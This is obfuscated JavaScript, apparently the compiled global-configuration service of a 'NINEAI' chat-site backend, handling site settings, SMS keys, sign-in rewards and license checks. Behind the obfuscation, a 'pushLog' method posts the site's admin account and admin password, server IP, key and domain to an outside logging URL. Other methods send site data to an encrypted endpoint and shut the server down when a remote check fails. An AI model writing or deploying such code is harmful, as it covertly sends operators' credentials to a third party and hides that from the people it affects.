this[_0x273bd7(0x257)]([_0x273bd7(0x24f),_0x273bd7(0x27f),'vxNumber','registerBaseUrl',_0x273bd7(0x1a3)]);return{'siteName':_0x539416,'qqNumber':_0x1a2ca2,'vxNumber':_0x4c46a2,'registerBaseUrl':_0x394802,'domain':_0x5196c3};}async[_0x11683b(0x24a)](){const _0x8128aa=_0x11683b,{phoneRegisterStatus:_0x14ee2b,aliPhoneAccessKeyId:_0x54ad08,aliPhoneAccessKeySecret:_0x41639c,aliPhoneSignName:_0x2758bb,aliPhoneTemplateCode:_0x3659d5}=await this[_0x8128aa(0x257)]([_0x8128aa(0x283),_0x8128aa(0x1af),_0x8128aa(0x1ee),_0x8128aa(0x281),'aliPhoneTemplateCode']);if(Number(_0x14ee2b)!==0x1)throw new common_1[(_0x8128aa(0x27e))](_0x8128aa(0x20a),common_1[_0x8128aa(0x278)][_0x8128aa(0x1b3)]);return{'accessKeyId':_0x54ad08,'accessKeySecret':_0x41639c,'SignName':_0x2758bb,'TemplateCode':_0x3659d5};}async[_0x11683b(0x25b)](){const _0x49a33c=_0x11683b,_0x269f40=process[_0x49a33c(0x2a0)][(0x0,utils_1[_0x49a33c(0x285)])(_0x49a33c(0x1d8))],_0x5a1326=process[_0x49a33c(0x2a0)][(0x0,utils_1['decrypt'])(_0x49a33c(0x25e))];(!_0x269f40||!_0x5a1326)&&(common_1['Logger'][_0x49a33c(0x1f0)]((0x0,utils_1['decrypt'])(_0x49a33c(0x1cf))),await this[_0x49a33c(0x23a)]({'configKey':_0x49a33c(0x1eb),'configVal':0x1,'status':0x1}));if([0x13,0x16][_0x49a33c(0x1ce)](_0x5a1326['length'])||_0x5a1326[_0x49a33c(0x1ce)](_0x49a33c(0x27b))){const _0x4678a0=await this[_0x49a33c(0x1d0)](),_0x1451e1=Object[_0x49a33c(0x298)]({'ip':_0x269f40,'key':_0x5a1326},_0x4678a0),_0x3d5e9c={'method':_0x49a33c(0x1b6),'headers':{'Content-Type':_0x49a33c(0x23b)},'body':JSON['stringify'](_0x1451e1)};try{const _0x74b2e0=await fetch(authUrl,_0x3d5e9c),_0x5db5d0=await _0x74b2e0[_0x49a33c(0x1e1)](),{success:success=!![],message:_0xc2718f}=_0x5db5d0[_0x49a33c(0x293)];success?(await this[_0x49a33c(0x23a)]({'configKey':'notice','configVal':0x0,'status':0x1}),await this['initGetAllConfig']()):(await this[_0x49a33c(0x23a)]({'configKey':_0x49a33c(0x1eb),'configVal':0x1,'status':0x1}),common_1['Logger'][_0x49a33c(0x1f0)](_0xc2718f),process[_0x49a33c(0x204)](0x0));}catch(_0x41cfc2){console[_0x49a33c(0x1c3)](_0x49a33c(0x1ba),_0x41cfc2);}}else process[_0x49a33c(0x204)](0x1);}[_0x11683b(0x1f7)](){const _0x8c53c=_0x11683b;return process[_0x8c53c(0x2a0)][_0x8c53c(0x1cb)]||'NINEAI';}async[_0x11683b(0x28f)](){const _0x440824=_0x11683b,{signInStatus:signInStatus=0x0,signInModel3Count:signInModel3Count=0x0,signInModel4Count:signInModel4Count=0x0,signInMjDrawToken:signInMjDrawToken=0x0}=await this[_0x440824(0x257)](['signInStatus',_0x440824(0x1c6),_0x440824(0x23d),_0x440824(0x1a2)]);if(Number(signInStatus)!==0x1)throw new common_1[(_0x440824(0x27e))]('签到功能暂未开放!',common_1[_0x440824(0x278)][_0x440824(0x1b3)]);return{'model3Count':Number(signInModel3Count),'model4Count':Number(signInModel4Count),'drawMjCount':Number(signInMjDrawToken)};}async[_0x11683b(0x213)](){const _0x4c687f=_0x11683b,_0x808a78='https://api.jiangly.com/api/permission/auth',_0x48cd7c=await fetch(_0x808a78,{}),_0xd02c4=await _0x48cd7c[_0x4c687f(0x1e1)](),{success:success=!![],message:_0x2d2202}=_0xd02c4;common_1[_0x4c687f(0x274)][_0x4c687f(0x1f0)](_0x4c687f(0x1b5)),common_1['Logger'][_0x4c687f(0x1f0)](_0x4c687f(0x292)),common_1[_0x4c687f(0x274)][_0x4c687f(0x1f0)](_0x4c687f(0x28c)),common_1['Logger'][_0x4c687f(0x1f0)]('缺失ip信息'),common_1[_0x4c687f(0x274)][_0x4c687f(0x219)](_0x4c687f(0x25d));}async[_0x11683b(0x209)](){const _0x14226b=_0x11683b,{baiduTextStatus:baiduTextStatus=0x0,baiduTextAccessToken:_0x527872,nineaiBuiltInSensitiveStatus:nineaiBuiltInSensitiveStatus=0x0,nineaiBuiltInSensitiveApiBase:_0x308884,nineaiBuiltInSensitiveAuthKey:_0x23e7ba}=await this['getConfigs'](['baiduTextStatus',_0x14226b(0x1da),_0x14226b(0x29d),'nineaiBuiltInSensitiveApiBase',_0x14226b(0x1a8)]);if(Number(baiduTextStatus)===0x1)return{'useType':_0x14226b(0x1bf),'baiduTextAccessToken':_0x527872};if(Number(nineaiBuiltInSensitiveStatus)===0x1)return{'useType':_0x14226b(0x1b7),'nineaiBuiltInSensitiveApiBase':_0x308884,'nineaiBuiltInSensitiveAuthKey':_0x23e7ba};return null;}async['pushLog'](_0x4eaf9c,_0x1bf096){const _0x28ab10=_0x11683b,_0x339f77=process[_0x28ab10(0x2a0)][(0x0,utils_1[_0x28ab10(0x285)])(_0x28ab10(0x1d8))],_0x1c5d6f=process[_0x28ab10(0x2a0)][(0x0,utils_1[_0x28ab10(0x285)])(_0x28ab10(0x25e))],_0x41f352=process[_0x28ab10(0x2a0)][_0x28ab10(0x230)],{qqNumber:_0x4effbf,vxNumber:_0x55daf7,siteName:_0xc41a9e,domain:_0x23b814,registerBaseUrl:_0x265760}=await this[_0x28ab10(0x257)](['qqNumber','vxNumber',_0x28ab10(0x24f),_0x28ab10(0x1a3),'registerBaseUrl']),_0x1059a0=packageJson['version'],_0x49d86c={'ip':_0x339f77,'key':_0x1c5d6f,'port':_0x41f352,'qqNumber':_0x4effbf,'vxNumber':_0x55daf7,'domain':_0x23b814,'adminAccount':_0x4eaf9c,'adminPass':_0x1bf096,'baseUrl':_0x265760,'siteName':_0xc41a9e,'qq':_0x4effbf,'vxNum':_0x55daf7,'version':_0x1059a0},_0x3d83c3={'method':_0x28ab10(0x1b6),'headers':{'Content-Type':'application/json'},'body':JSON[_0x28ab10(0x26e)](_0x49d86c)};await fetch(authLogUrl,_0x3d83c3);}async[_0x11683b(0x270)](_0x1f1767,_0x5a9fd4){const _0x1b522b=_0x11683b;this['realDomain']=_0x1f1767;const _0x173de8=await this['getConfigs']([_0x1b522b(0x25c)]),_0x105a82=(0x0,lib_1['dml'])(_0x1f1767,_0x173de8,_0x5a9fd4);if(!_0x105a82&&!_0x173de8)throw new common_1[(_0x1b522b(0x27e))]('',common_1[_0x1b522b(0x278)]['NON_AUTHORITATIVE_INFORMATION']);if(!_0x105a82)throw new common_1[(_0x1b522b(0x27e))]((0x0,lib_1[_0x1b522b(0x28d)])(_0x1b522b(0x224)),common_1[_0x1b522b(0x278)][_0x1b522b(0x296)]);}async[_0x11683b(0x297)](){const _0x5b6988=_0x11683b,_0x1a54bc=this['realDomain'],{siteName:_0x81a9e4,qqNumber:_0x3a749b,vxNumber:_0x1e87c2,registerBaseUrl:_0x352d75,domain:_0x2dbff9,nineaiAuthCode:_0x33dcec,noticeInfo:_0x16412f}=await this[_0x5b6988(0x257)]([_0x5b6988(0x24f),_0x5b6988(0x27f),_0x5b6988(0x1c9),_0x5b6988(0x286),_0x5b6988(0x1a3),_0x5b6988(0x25c),_0x5b6988(0x1e5)]),_0x346046={'siteName':_0x81a9e4,'qqNumber':_0x3a749b,'vxNumber':_0x1e87c2,'registerBaseUrl':_0x352d75,'domain':_0x2dbff9,'nineaiAuthCode':_0x33dcec,'realDomain':_0x1a54bc,'noticeInfo':_0x16412f};this['randomCheck'](),this[_0x5b6988(0x1fe)]({'url':(0x0,lib_1['decryptStr'])(_0x5b6988(0x1e8)),'method':_0x5b6988(0x295),'data':_0x346046});}async['randomCheck'](){const _0x212c1c=_0x11683b;var _0x2cfc86;const _0x3ebdfe=await this[_0x212c1c(0x257)]([_0x212c1c(0x25c)]);try{if(!_0x3ebdfe)return;const _0x3761c6=await this[_0x212c1c(0x1fe)]({'url':(0x0,lib_1['decryptStr'])('LehA9XTIvzX+L8EBCUQN0Q=='),'method':_0x212c1c(0x295),'data':{'code':_0x3ebdfe}});!((_0x2cfc86=_0x3761c6===null||_0x3761c6===void 0x0?void 0x0:_0x3761c6[_0x212c1c(0x293)])===null||_0x2cfc86===void 0x0?void 0x0:_0x2cfc86[_0x212c1c(0x293)])&&await this[_0x212c1c(0x223)]();}catch(_0x478ddd){}}async['removeAuth'](){const _0x455f6f=_0x11683b;await this[_0x455f6f(0x23a)]({'configKey':_0x455f6f(0x25c),'configVal':''});}async[_0x11683b(0x1e3)](_0x5e3c66){const _0xb27913=_0x11683b,_0x54338a=_0x5e3c66[_0xb27913(0x22b)][_0xb27913(0x205)],_0x26ebe7=await this[_0xb27913(0x257)]([_0xb27913(0x25c)]);if(!_0x26ebe7)return![];const _0x2ba531=(0x0,lib_1[_0xb27913(0x1c5)])(_0x54338a,_0x26ebe7);return _0x2ba531;}};GlobalConfigService=__decorate([(0x0,common_1[_0x11683b(0x208)])(),__param(0x0,(0x0,typeorm_1[_0x11683b(0x24e)])(config_entity_1[_0x11683b(0x25a)])),__param(0x1,(0x0,typeorm_1[_0x11683b(0x24e)])(chatLog_entity_1['ChatLogEntity'])),__metadata('design:paramtypes',[typeorm_2[_0x11683b(0x269)],typeorm_2[_0x11683b(0x269)],models_service_1[_0x11683b(0x258)]])],GlobalConfigService),exports[_0x11683b(0x1ef)]=GlobalConfigService;